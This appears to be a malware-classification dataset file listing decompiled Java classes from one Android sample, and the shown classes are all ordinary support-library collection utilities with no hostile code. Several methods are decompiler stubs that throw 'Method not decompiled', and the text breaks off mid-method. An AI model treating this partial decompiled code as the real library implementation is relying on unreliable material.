"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\EntrySet.code","final class EntrySet implements Set<Map.Entry<K,V>> {   EntrySet(){   }   @Override public boolean add(  Map.Entry<K,V> object){     throw new UnsupportedOperationException();   }   @Override public boolean addAll(  Collection<? extends Map.Entry<K,V>> collection){     int oldSize=MapCollections.this.colGetSize();     for (    Map.Entry<K,V> entry : collection) {       MapCollections.this.colPut(entry.getKey(),entry.getValue());     }     return oldSize != MapCollections.this.colGetSize();   }   @Override public void clear(){     MapCollections.this.colClear();   }   @Override public boolean contains(  Object o){     if (!(o instanceof Map.Entry)) {       return false;     }     Map.Entry<?,?> e=(Map.Entry)o;     int index=MapCollections.this.colIndexOfKey(e.getKey());     if (index < 0) {       return false;     }     Object foundVal=MapCollections.this.colGetEntry(index,1);     return ContainerHelpers.equal(foundVal,e.getValue());   }   @Override public boolean containsAll(  Collection<?> collection){     Iterator<?> it=collection.iterator();     while (it.hasNext()) {       if (!contains(it.next())) {         return false;       }     }     return true;   }   @Override public boolean isEmpty(){     return MapCollections.this.colGetSize() == 0;   }   @Override public Iterator<Map.Entry<K,V>> iterator(){     return new MapIterator();   }   @Override public boolean remove(  Object object){     throw new UnsupportedOperationException();   }   @Override public boolean removeAll(  Collection<?> collection){     throw new UnsupportedOperationException();   }   @Override public boolean retainAll(  Collection<?> collection){     throw new UnsupportedOperationException();   }   @Override public int size(){     return MapCollections.this.colGetSize();   }   @Override public Object[] toArray(){     throw new UnsupportedOperationException();   }   @Override public <T>T[] toArray(  T[] array){     throw new UnsupportedOperationException();   }   @Override public boolean equals(  Object object){     return MapCollections.equalsSetHelper(this,object);   }   @Override public int hashCode(){     int result=0;     for (int i=MapCollections.this.colGetSize() - 1; i >= 0; i--) {       Object key=MapCollections.this.colGetEntry(i,0);       Object value=MapCollections.this.colGetEntry(i,1);       result+=(value == null ? 0 : value.hashCode()) ^ (key == null ? 0 : key.hashCode());     }     return result;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\KeySet.code","final class KeySet implements Set<K> {   KeySet(){   }   @Override public boolean add(  K object){     throw new UnsupportedOperationException();   }   @Override public boolean addAll(  Collection<? extends K> collection){     throw new UnsupportedOperationException();   }   @Override public void clear(){     MapCollections.this.colClear();   }   @Override public boolean contains(  Object object){     return MapCollections.this.colIndexOfKey(object) >= 0;   }   @Override public boolean containsAll(  Collection<?> collection){     return MapCollections.containsAllHelper(MapCollections.this.colGetMap(),collection);   }   @Override public boolean isEmpty(){     return MapCollections.this.colGetSize() == 0;   }   @Override public Iterator<K> iterator(){     return new ArrayIterator(0);   }   @Override public boolean remove(  Object object){     int index=MapCollections.this.colIndexOfKey(object);     if (index < 0) {       return false;     }     MapCollections.this.colRemoveAt(index);     return true;   }   @Override public boolean removeAll(  Collection<?> collection){     return MapCollections.removeAllHelper(MapCollections.this.colGetMap(),collection);   }   @Override public boolean retainAll(  Collection<?> collection){     return MapCollections.retainAllHelper(MapCollections.this.colGetMap(),collection);   }   @Override public int size(){     return MapCollections.this.colGetSize();   }   @Override public Object[] toArray(){     return MapCollections.this.toArrayHelper(0);   }   @Override public <T>T[] toArray(  T[] tArr){     return (T[])MapCollections.this.toArrayHelper(tArr,0);   }   @Override public boolean equals(  Object object){     return MapCollections.equalsSetHelper(this,object);   }   @Override public int hashCode(){     int result=0;     for (int i=MapCollections.this.colGetSize() - 1; i >= 0; i--) {       Object obj=MapCollections.this.colGetEntry(i,0);       result+=obj == null ? 0 : obj.hashCode();     }     return result;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\LogWriter.code","public class LogWriter extends Writer {   private StringBuilder mBuilder=new StringBuilder(128);   private final String mTag;   public LogWriter(  String tag){     this.mTag=tag;   }   @Override public void close(){     flushBuilder();   }   @Override public void flush(){     flushBuilder();   }   @Override public void write(  char[] buf,  int offset,  int count){     for (int i=0; i < count; i++) {       char c=buf[offset + i];       if (c == '\n') {         flushBuilder();       }  else {         this.mBuilder.append(c);       }     }   }   private void flushBuilder(){     if (this.mBuilder.length() > 0) {       Log.d(this.mTag,this.mBuilder.toString());       this.mBuilder.delete(0,this.mBuilder.length());     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\LongSparseArray.code","public class LongSparseArray<E> implements Cloneable {   private static final Object DELETED=new Object();   private boolean mGarbage;   private long[] mKeys;   private int mSize;   private Object[] mValues;   public LongSparseArray(){     this(10);   }   public LongSparseArray(  int initialCapacity){     this.mGarbage=false;     if (initialCapacity == 0) {       this.mKeys=ContainerHelpers.EMPTY_LONGS;       this.mValues=ContainerHelpers.EMPTY_OBJECTS;     }  else {       int initialCapacity2=ContainerHelpers.idealLongArraySize(initialCapacity);       this.mKeys=new long[initialCapacity2];       this.mValues=new Object[initialCapacity2];     }     this.mSize=0;   }   public LongSparseArray<E> m0clone(){     LongSparseArray<E> clone=null;     try {       clone=(LongSparseArray)super.clone();       clone.mKeys=(long[])this.mKeys.clone();       clone.mValues=(Object[])this.mValues.clone();       return clone;     }  catch (    CloneNotSupportedException e) {       return clone;     }   }   public E get(  long key){     return get(key,null);   }   public E get(  long j,  E e){     int binarySearch=ContainerHelpers.binarySearch(this.mKeys,this.mSize,j);     return (binarySearch < 0 || this.mValues[binarySearch] == DELETED) ? e : (E)this.mValues[binarySearch];   }   public void delete(  long key){     int i=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);     if (i >= 0 && this.mValues[i] != DELETED) {       this.mValues[i]=DELETED;       this.mGarbage=true;     }   }   public void remove(  long key){     delete(key);   }   public void removeAt(  int index){     if (this.mValues[index] != DELETED) {       this.mValues[index]=DELETED;       this.mGarbage=true;     }   }   private void gc(){     int n=this.mSize;     int o=0;     long[] keys=this.mKeys;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       Object val=values[i];       if (val != DELETED) {         if (i != o) {           keys[o]=keys[i];           values[o]=val;           values[i]=null;         }         o++;       }     }     this.mGarbage=false;     this.mSize=o;   }   public void put(  long key,  E value){     int i=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);     if (i >= 0) {       this.mValues[i]=value;       return;     }     int i2=i ^ (-1);     if (i2 < this.mSize && this.mValues[i2] == DELETED) {       this.mKeys[i2]=key;       this.mValues[i2]=value;       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();       i2=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key) ^ (-1);     }     if (this.mSize >= this.mKeys.length) {       int n=ContainerHelpers.idealLongArraySize(this.mSize + 1);       long[] nkeys=new long[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     if (this.mSize - i2 != 0) {       System.arraycopy(this.mKeys,i2,this.mKeys,i2 + 1,this.mSize - i2);       System.arraycopy(this.mValues,i2,this.mValues,i2 + 1,this.mSize - i2);     }     this.mKeys[i2]=key;     this.mValues[i2]=value;     this.mSize++;   }   public int size(){     if (this.mGarbage) {       gc();     }     return this.mSize;   }   public long keyAt(  int index){     if (this.mGarbage) {       gc();     }     return this.mKeys[index];   }   public E valueAt(  int i){     if (this.mGarbage) {       gc();     }     return (E)this.mValues[i];   }   public void setValueAt(  int index,  E value){     if (this.mGarbage) {       gc();     }     this.mValues[index]=value;   }   public int indexOfKey(  long key){     if (this.mGarbage) {       gc();     }     return ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);   }   public int indexOfValue(  E value){     if (this.mGarbage) {       gc();     }     for (int i=0; i < this.mSize; i++) {       if (this.mValues[i] == value) {         return i;       }     }     return -1;   }   public void clear(){     int n=this.mSize;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       values[i]=null;     }     this.mSize=0;     this.mGarbage=false;   }   public void append(  long key,  E value){     if (this.mSize != 0 && key <= this.mKeys[this.mSize - 1]) {       put(key,value);       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();     }     int pos=this.mSize;     if (pos >= this.mKeys.length) {       int n=ContainerHelpers.idealLongArraySize(pos + 1);       long[] nkeys=new long[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     this.mKeys[pos]=key;     this.mValues[pos]=value;     this.mSize=pos + 1;   }   public String toString(){     if (size() <= 0) {       return ""{}"";     }     StringBuilder buffer=new StringBuilder(this.mSize * 28);     buffer.append('{');     for (int i=0; i < this.mSize; i++) {       if (i > 0) {         buffer.append("", "");       }       long key=keyAt(i);       buffer.append(key);       buffer.append('=');       Object value=valueAt(i);       if (value != this) {         buffer.append(value);       }  else {         buffer.append(""(this Map)"");       }     }     buffer.append('}');     return buffer.toString();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\LruCache.code","public class LruCache<K,V> {   private int createCount;   private int evictionCount;   private int hitCount;   private final LinkedHashMap<K,V> map;   private int maxSize;   private int missCount;   private int putCount;   private int size;   public LruCache(  int maxSize){     if (maxSize <= 0) {       throw new IllegalArgumentException(""maxSize <= 0"");     }     this.maxSize=maxSize;     this.map=new LinkedHashMap<>(0,0.75f,true);   }   public final V get(  K k){     V v;     if (k == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       V v2=this.map.get(k);       if (v2 != null) {         this.hitCount++;         return v2;       }       this.missCount++;       V create=create(k);       if (create == null) {         return null;       } synchronized (this) {         this.createCount++;         v=(V)this.map.put(k,create);         if (v != null) {           this.map.put(k,v);         }  else {           this.size+=safeSizeOf(k,create);         }       }       if (v != null) {         entryRemoved(false,k,create,v);         return v;       }       trimToSize(this.maxSize);       return create;     }   }   public final V put(  K key,  V value){     V previous;     if (key == null || value == null) {       throw new NullPointerException(""key == null || value == null"");     } synchronized (this) {       this.putCount++;       this.size+=safeSizeOf(key,value);       previous=this.map.put(key,value);       if (previous != null) {         this.size-=safeSizeOf(key,previous);       }     }     if (previous != null) {       entryRemoved(false,key,previous,value);     }     trimToSize(this.maxSize);     return previous;   }   public void trimToSize(  int r7){     throw new UnsupportedOperationException(""Method not decompiled: android.support.v4.util.LruCache.trimToSize(int):void"");   }   public final V remove(  K key){     V previous;     if (key == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       previous=this.map.remove(key);       if (previous != null) {         this.size-=safeSizeOf(key,previous);       }     }     if (previous != null) {       entryRemoved(false,key,previous,null);     }     return previous;   }   protected void entryRemoved(  boolean evicted,  K key,  V oldValue,  V newValue){   }   protected V create(  K key){     return null;   }   private int safeSizeOf(  K key,  V value){     int result=sizeOf(key,value);     if (result < 0) {       throw new IllegalStateException(""Negative size: "" + key + ""=""+ value);     }     return result;   }   protected int sizeOf(  K key,  V value){     return 1;   }   public final void evictAll(){     trimToSize(-1);   }   public final synchronized int size(){     return this.size;   }   public final synchronized int maxSize(){     return this.maxSize;   }   public final synchronized int hitCount(){     return this.hitCount;   }   public final synchronized int missCount(){     return this.missCount;   }   public final synchronized int createCount(){     return this.createCount;   }   public final synchronized int putCount(){     return this.putCount;   }   public final synchronized int evictionCount(){     return this.evictionCount;   }   public final synchronized Map<K,V> snapshot(){     return new LinkedHashMap(this.map);   }   public final synchronized String toString(){     String format; synchronized (this) {       int accesses=this.hitCount + this.missCount;       int hitPercent=accesses != 0 ? (this.hitCount * 100) / accesses : 0;       format=String.format(""LruCache[maxSize=%d,hits=%d,misses=%d,hitRate=%d%%]"",Integer.valueOf(this.maxSize),Integer.valueOf(this.hitCount),Integer.valueOf(this.missCount),Integer.valueOf(hitPercent));     }     return format;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\MapCollections.code","public abstract class MapCollections<K,V> {   MapCollections<K,V>.EntrySet mEntrySet;   MapCollections<K,V>.KeySet mKeySet;   MapCollections<K,V>.ValuesCollection mValues;   protected abstract void colClear();   protected abstract Object colGetEntry(  int i,  int i2);   protected abstract Map<K,V> colGetMap();   protected abstract int colGetSize();   protected abstract int colIndexOfKey(  Object obj);   protected abstract int colIndexOfValue(  Object obj);   protected abstract void colPut(  K k,  V v);   protected abstract void colRemoveAt(  int i);   protected abstract V colSetValue(  int i,  V v); final class ArrayIterator<T> implements Iterator<T> {     boolean mCanRemove=false;     int mIndex;     final int mOffset;     int mSize;     ArrayIterator(    int offset){       this.mOffset=offset;       this.mSize=MapCollections.this.colGetSize();     }     @Override public boolean hasNext(){       return this.mIndex < this.mSize;     }     @Override public T next(){       T t=(T)MapCollections.this.colGetEntry(this.mIndex,this.mOffset);       this.mIndex++;       this.mCanRemove=true;       return t;     }     @Override public void remove(){       if (!this.mCanRemove) {         throw new IllegalStateException();       }       this.mIndex--;       this.mSize--;       this.mCanRemove=false;       MapCollections.this.colRemoveAt(this.mIndex);     }   } final class MapIterator implements Iterator<Map.Entry<K,V>>, Map.Entry<K,V> {     int mEnd;     boolean mEntryValid=false;     int mIndex=-1;     MapIterator(){       this.mEnd=MapCollections.this.colGetSize() - 1;     }     @Override public boolean hasNext(){       return this.mIndex < this.mEnd;     }     @Override public Map.Entry<K,V> next(){       this.mIndex++;       this.mEntryValid=true;       return this;     }     @Override public void remove(){       if (!this.mEntryValid) {         throw new IllegalStateException();       }       this.mIndex--;       this.mEnd--;       this.mEntryValid=false;       MapCollections.this.colRemoveAt(this.mIndex);     }     @Override public K getKey(){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       return (K)MapCollections.this.colGetEntry(this.mIndex,0);     }     @Override public V getValue(){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       return (V)MapCollections.this.colGetEntry(this.mIndex,1);     }     @Override public V setValue(    V v){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       return (V)MapCollections.this.colSetValue(this.mIndex,v);     }     @Override public final boolean equals(    Object o){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       if (!(o instanceof Map.Entry)) {         return false;       }       Map.Entry<?,?> e=(Map.Entry)o;       return ContainerHelpers.equal(e.getKey(),MapCollections.this.colGetEntry(this.mIndex,0)) && ContainerHelpers.equal(e.getValue(),MapCollections.this.colGetEntry(this.mIndex,1));     }     @Override public final int hashCode(){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       Object key=MapCollections.this.colGetEntry(this.mIndex,0);       Object value=MapCollections.this.colGetEntry(this.mIndex,1);       return (value != null ? value.hashCode() : 0) ^ (key == null ? 0 : key.hashCode());     }     public final String toString(){       return getKey() + ""="" + getValue();     }   } final class EntrySet implements Set<Map.Entry<K,V>> {     EntrySet(){     }     @Override public boolean add(    Map.Entry<K,V> object){       throw new UnsupportedOperationException();     }     @Override public boolean addAll(    Collection<? extends Map.Entry<K,V>> collection){       int oldSize=MapCollections.this.colGetSize();       for (      Map.Entry<K,V> entry : collection) {         MapCollections.this.colPut(entry.getKey(),entry.getValue());       }       return oldSize != MapCollections.this.colGetSize();     }     @Override public void clear(){       MapCollections.this.colClear();     }     @Override public boolean contains(    Object o){       if (!(o instanceof Map.Entry)) {         return false;       }       Map.Entry<?,?> e=(Map.Entry)o;       int index=MapCollections.this.colIndexOfKey(e.getKey());       if (index < 0) {         return false;       }       Object foundVal=MapCollections.this.colGetEntry(index,1);       return ContainerHelpers.equal(foundVal,e.getValue());     }     @Override public boolean containsAll(    Collection<?> collection){       Iterator<?> it=collection.iterator();       while (it.hasNext()) {         if (!contains(it.next())) {           return false;         }       }       return true;     }     @Override public boolean isEmpty(){       return MapCollections.this.colGetSize() == 0;     }     @Override public Iterator<Map.Entry<K,V>> iterator(){       return new MapIterator();     }     @Override public boolean remove(    Object object){       throw new UnsupportedOperationException();     }     @Override public boolean removeAll(    Collection<?> collection){       throw new UnsupportedOperationException();     }     @Override public boolean retainAll(    Collection<?> collection){       throw new UnsupportedOperationException();     }     @Override public int size(){       return MapCollections.this.colGetSize();     }     @Override public Object[] toArray(){       throw new UnsupportedOperationException();     }     @Override public <T>T[] toArray(    T[] array){       throw new UnsupportedOperationException();     }     @Override public boolean equals(    Object object){       return MapCollections.equalsSetHelper(this,object);     }     @Override public int hashCode(){       int result=0;       for (int i=MapCollections.this.colGetSize() - 1; i >= 0; i--) {         Object key=MapCollections.this.colGetEntry(i,0);         Object value=MapCollections.this.colGetEntry(i,1);         result+=(value == null ? 0 : value.hashCode()) ^ (key == null ? 0 : key.hashCode());       }       return result;     }   } final class KeySet implements Set<K> {     KeySet(){     }     @Override public boolean add(    K object){       throw new UnsupportedOperationException();     }     @Override public boolean addAll(    Collection<? extends K> collection){       throw new UnsupportedOperationException();     }     @Override public void clear(){       MapCollections.this.colClear();     }     @Override public boolean contains(    Object object){       return MapCollections.this.colIndexOfKey(object) >= 0;     }     @Override public boolean containsAll(    Collection<?> collection){       return MapCollections.containsAllHelper(MapCollections.this.colGetMap(),collection);     }     @Override public boolean isEmpty(){       return MapCollections.this.colGetSize() == 0;     }     @Override public Iterator<K> iterator(){       return new ArrayIterator(0);     }     @Override public boolean remove(    Object object){       int index=MapCollections.this.colIndexOfKey(object);       if (index < 0) {         return false;       }       MapCollections.this.colRemoveAt(index);       return true;     }     @Override public boolean removeAll(    Collection<?> collection){       return MapCollections.removeAllHelper(MapCollections.this.colGetMap(),collection);     }     @Override public boolean retainAll(    Collection<?> collection){       return MapCollections.retainAllHelper(MapCollections.this.colGetMap(),collection);     }     @Override public int size(){       return MapCollections.this.colGetSize();     }     @Override public Object[] toArray(){       return MapCollections.this.toArrayHelper(0);     }     @Override public <T>T[] toArray(    T[] tArr){       return (T[])MapCollections.this.toArrayHelper(tArr,0);     }     @Override public boolean equals(    Object object){       return MapCollections.equalsSetHelper(this,object);     }     @Override public int hashCode(){       int result=0;       for (int i=MapCollections.this.colGetSize() - 1; i >= 0; i--) {         Object obj=MapCollections.this.colGetEntry(i,0);         result+=obj == null ? 0 : obj.hashCode();       }       return result;     }   } final class ValuesCollection implements Collection<V> {     ValuesCollection(){     }     @Override public boolean add(    V object){       throw new UnsupportedOperationException();     }     @Override public boolean addAll(    Collection<? extends V> collection){       throw new UnsupportedOperationException();     }     @Override public void clear(){       MapCollections.this.colClear();     }     @Override public boolean contains(    Object object){       return MapCollections.this.colIndexOfValue(object) >= 0;     }     @Override public boolean containsAll(    Collection<?> collection){       Iterator<?> it=collection.iterator();       while (it.hasNext()) {         if (!contains(it.next())) {           return false;         }       }       return true;     }     @Override public boolean isEmpty(){       return MapCollections.this.colGetSize() == 0;     }     @Override public Iterator<V> iterator(){       return new ArrayIterator(1);     }     @Override public boolean remove(    Object object){       int index=MapCollections.this.colIndexOfValue(object);       if (index < 0) {         return false;       }       MapCollections.this.colRemoveAt(index);       return true;     }     @Override public boolean removeAll(    Collection<?> collection){       int N=MapCollections.this.colGetSize();       boolean changed=false;       int i=0;       while (i < N) {         Object cur=MapCollections.this.colGetEntry(i,1);         if (collection.contains(cur)) {           MapCollections.this.colRemoveAt(i);           i--;           N--;           changed=true;         }         i++;       }       return changed;     }     @Override public boolean retainAll(    Collection<?> collection){       int N=MapCollections.this.colGetSize();       boolean changed=false;       int i=0;       while (i < N) {         Object cur=MapCollections.this.colGetEntry(i,1);         if (!collection.contains(cur)) {           MapCollections.this.colRemoveAt(i);           i--;           N--;           changed=true;         }         i++;       }       return changed;     }     @Override public int size(){       return MapCollections.this.colGetSize();     }     @Override public Object[] toArray(){       return MapCollections.this.toArrayHelper(1);     }     @Override public <T>T[] toArray(    T[] tArr){       return (T[])MapCollections.this.toArrayHelper(tArr,1);     }   }   public static <K,V>boolean containsAllHelper(  Map<K,V> map,  Collection<?> collection){     Iterator<?> it=collection.iterator();     while (it.hasNext()) {       if (!map.containsKey(it.next())) {         return false;       }     }     return true;   }   public static <K,V>boolean removeAllHelper(  Map<K,V> map,  Collection<?> collection){     int oldSize=map.size();     Iterator<?> it=collection.iterator();     while (it.hasNext()) {       map.remove(it.next());     }     return oldSize != map.size();   }   public static <K,V>boolean retainAllHelper(  Map<K,V> map,  Collection<?> collection){     int oldSize=map.size();     Iterator<K> it=map.keySet().iterator();     while (it.hasNext()) {       if (!collection.contains(it.next())) {         it.remove();       }     }     return oldSize != map.size();   }   public Object[] toArrayHelper(  int offset){     int N=colGetSize();     Object[] result=new Object[N];     for (int i=0; i < N; i++) {       result[i]=colGetEntry(i,offset);     }     return result;   }   public <T>T[] toArrayHelper(  T[] tArr,  int i){     int colGetSize=colGetSize();     if (tArr.length < colGetSize) {       tArr=(Object[])Array.newInstance(tArr.getClass().getComponentType(),colGetSize);     }     for (int i2=0; i2 < colGetSize; i2++) {       tArr[i2]=colGetEntry(i2,i);     }     if (tArr.length > colGetSize) {       tArr[colGetSize]=0;     }     return tArr;   }   public static <T>boolean equalsSetHelper(  java.util.Set<T> r6,  java.lang.Object r7){     throw new UnsupportedOperationException(""Method not decompiled: android.support.v4.util.MapCollections.equalsSetHelper(java.util.Set, java.lang.Object):boolean"");   }   public Set<Map.Entry<K,V>> getEntrySet(){     if (this.mEntrySet == null) {       this.mEntrySet=new EntrySet();     }     return this.mEntrySet;   }   public Set<K> getKeySet(){     if (this.mKeySet == null) {       this.mKeySet=new KeySet();     }     return this.mKeySet;   }   public Collection<V> getValues(){     if (this.mValues == null) {       this.mValues=new ValuesCollection();     }     return this.mValues;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\MapIterator.code","final class MapIterator implements Iterator<Map.Entry<K,V>>, Map.Entry<K,V> {   int mEnd;   boolean mEntryValid=false;   int mIndex=-1;   MapIterator(){     this.mEnd=MapCollections.this.colGetSize() - 1;   }   @Override public boolean hasNext(){     return this.mIndex < this.mEnd;   }   @Override public Map.Entry<K,V> next(){     this.mIndex++;     this.mEntryValid=true;     return this;   }   @Override public void remove(){     if (!this.mEntryValid) {       throw new IllegalStateException();     }     this.mIndex--;     this.mEnd--;     this.mEntryValid=false;     MapCollections.this.colRemoveAt(this.mIndex);   }   @Override public K getKey(){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     return (K)MapCollections.this.colGetEntry(this.mIndex,0);   }   @Override public V getValue(){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     return (V)MapCollections.this.colGetEntry(this.mIndex,1);   }   @Override public V setValue(  V v){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     return (V)MapCollections.this.colSetValue(this.mIndex,v);   }   @Override public final boolean equals(  Object o){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     if (!(o instanceof Map.Entry)) {       return false;     }     Map.Entry<?,?> e=(Map.Entry)o;     return ContainerHelpers.equal(e.getKey(),MapCollections.this.colGetEntry(this.mIndex,0)) && ContainerHelpers.equal(e.getValue(),MapCollections.this.colGetEntry(this.mIndex,1));   }   @Override public final int hashCode(){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     Object key=MapCollections.this.colGetEntry(this.mIndex,0);     Object value=MapCollections.this.colGetEntry(this.mIndex,1);     return (value != null ? value.hashCode() : 0) ^ (key == null ? 0 : key.hashCode());   }   public final String toString(){     return getKey() + ""="" + getValue();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\SimpleArrayMap.code","public class SimpleArrayMap<K,V> {   private static final int BASE_SIZE=4;   private static final int CACHE_SIZE=10;   private static final boolean DEBUG=false;   private static final String TAG=""ArrayMap"";   static Object[] mBaseCache;   static int mBaseCacheSize;   static Object[] mTwiceBaseCache;   static int mTwiceBaseCacheSize;   Object[] mArray;   int[] mHashes;   int mSize;   public int indexOf(  Object key,  int hash){     int N=this.mSize;     if (N == 0) {       return -1;     }     int index=ContainerHelpers.binarySearch(this.mHashes,N,hash);     if (index >= 0 && !key.equals(this.mArray[index << 1])) {       int end=index + 1;       while (end < N && this.mHashes[end] == hash) {         if (key.equals(this.mArray[end << 1])) {           return end;         }         end++;       }       for (int i=index - 1; i >= 0 && this.mHashes[i] == hash; i--) {         if (key.equals(this.mArray[i << 1])) {           return i;         }       }       return end ^ (-1);     }     return index;   }   public int indexOfNull(){     int N=this.mSize;     if (N == 0) {       return -1;     }     int index=ContainerHelpers.binarySearch(this.mHashes,N,0);     if (index >= 0 && this.mArray[index << 1] != null) {       int end=index + 1;       while (end < N && this.mHashes[end] == 0) {         if (this.mArray[end << 1] == null) {           return end;         }         end++;       }       for (int i=index - 1; i >= 0 && this.mHashes[i] == 0; i--) {         if (this.mArray[i << 1] == null) {           return i;         }       }       return end ^ (-1);     }     return index;   }   private void allocArrays(  int size){     if (size == 8) { synchronized (ArrayMap.class) {         if (mTwiceBaseCache != null) {           Object[] array=mTwiceBaseCache;           this.mArray=array;           mTwiceBaseCache=(Object[])array[0];           this.mHashes=(int[])array[1];           array[1]=null;           array[0]=null;           mTwiceBaseCacheSize--;           return;         }       }     }  else     if (size == 4) { synchronized (ArrayMap.class) {         if (mBaseCache != null) {           Object[] array2=mBaseCache;           this.mArray=array2;           mBaseCache=(Object[])array2[0];           this.mHashes=(int[])array2[1];           array2[1]=null;           array2[0]=null;           mBaseCacheSize--;           return;         }       }     }     this.mHashes=new int[size];     this.mArray=new Object[size << 1];   }   private static void freeArrays(  int[] hashes,  Object[] array,  int size){     if (hashes.length == 8) { synchronized (ArrayMap.class) {         if (mTwiceBaseCacheSize < 10) {           array[0]=mTwiceBaseCache;           array[1]=hashes;           for (int i=(size << 1) - 1; i >= 2; i--) {             array[i]=null;           }           mTwiceBaseCache=array;           mTwiceBaseCacheSize++;         }       }       return;     }     if (hashes.length == 4) { synchronized (ArrayMap.class) {         if (mBaseCacheSize < 10) {           array[0]=mBaseCache;           array[1]=hashes;           for (int i2=(size << 1) - 1; i2 >= 2; i2--) {             array[i2]=null;           }           mBaseCache=array;           mBaseCacheSize++;         }       }     }   }   public SimpleArrayMap(){     this.mHashes=ContainerHelpers.EMPTY_INTS;     this.mArray=ContainerHelpers.EMPTY_OBJECTS;     this.mSize=0;   }   public SimpleArrayMap(  int capacity){     if (capacity == 0) {       this.mHashes=ContainerHelpers.EMPTY_INTS;       this.mArray=ContainerHelpers.EMPTY_OBJECTS;     }  else {       allocArrays(capacity);     }     this.mSize=0;   }   public SimpleArrayMap(  SimpleArrayMap map){     this();     if (map != null) {       putAll(map);     }   }   public void clear(){     if (this.mSize != 0) {       freeArrays(this.mHashes,this.mArray,this.mSize);       this.mHashes=ContainerHelpers.EMPTY_INTS;       this.mArray=ContainerHelpers.EMPTY_OBJECTS;       this.mSize=0;     }   }   public void ensureCapacity(  int minimumCapacity){     if (this.mHashes.length < minimumCapacity) {       int[] ohashes=this.mHashes;       Object[] oarray=this.mArray;       allocArrays(minimumCapacity);       if (this.mSize > 0) {         System.arraycopy(ohashes,0,this.mHashes,0,this.mSize);         System.arraycopy(oarray,0,this.mArray,0,this.mSize << 1);       }       freeArrays(ohashes,oarray,this.mSize);     }   }   public boolean containsKey(  Object key){     if (key == null) {       if (indexOfNull() >= 0) {         return true;       }       return DEBUG;     }     if (indexOf(key,key.hashCode()) < 0) {       return DEBUG;     }     return true;   }   public int indexOfValue(  Object value){     int N=this.mSize * 2;     Object[] array=this.mArray;     if (value == null) {       for (int i=1; i < N; i+=2) {         if (array[i] == null) {           return i >> 1;         }       }     }  else {       for (int i2=1; i2 < N; i2+=2) {         if (value.equals(array[i2])) {           return i2 >> 1;         }       }     }     return -1;   }   public boolean containsValue(  Object value){     if (indexOfValue(value) >= 0) {       return true;     }     return DEBUG;   }   public V get(  Object obj){     int indexOfNull=obj == null ? indexOfNull() : indexOf(obj,obj.hashCode());     if (indexOfNull >= 0) {       return (V)this.mArray[(indexOfNull << 1) + 1];     }     return null;   }   public K keyAt(  int i){     return (K)this.mArray[i << 1];   }   public V valueAt(  int i){     return (V)this.mArray[(i << 1) + 1];   }   public V setValueAt(  int i,  V v){     int i2=(i << 1) + 1;     V v2=(V)this.mArray[i2];     this.mArray[i2]=v;     return v2;   }   public boolean isEmpty(){     if (this.mSize <= 0) {       return true;     }     return DEBUG;   }   public V put(  K k,  V v){     int hashCode;     int indexOf;     int i=8;     if (k == null) {       hashCode=0;       indexOf=indexOfNull();     }  else {       hashCode=k.hashCode();       indexOf=indexOf(k,hashCode);     }     if (indexOf >= 0) {       int i2=(indexOf << 1) + 1;       V v2=(V)this.mArray[i2];       this.mArray[i2]=v;       return v2;     }     int i3=indexOf ^ (-1);     if (this.mSize >= this.mHashes.length) {       if (this.mSize >= 8) {         i=this.mSize + (this.mSize >> 1);       }  else       if (this.mSize < 4) {         i=4;       }       int[] iArr=this.mHashes;       Object[] objArr=this.mArray;       allocArrays(i);       if (this.mHashes.length > 0) {         System.arraycopy(iArr,0,this.mHashes,0,iArr.length);         System.arraycopy(objArr,0,this.mArray,0,objArr.length);       }       freeArrays(iArr,objArr,this.mSize);     }     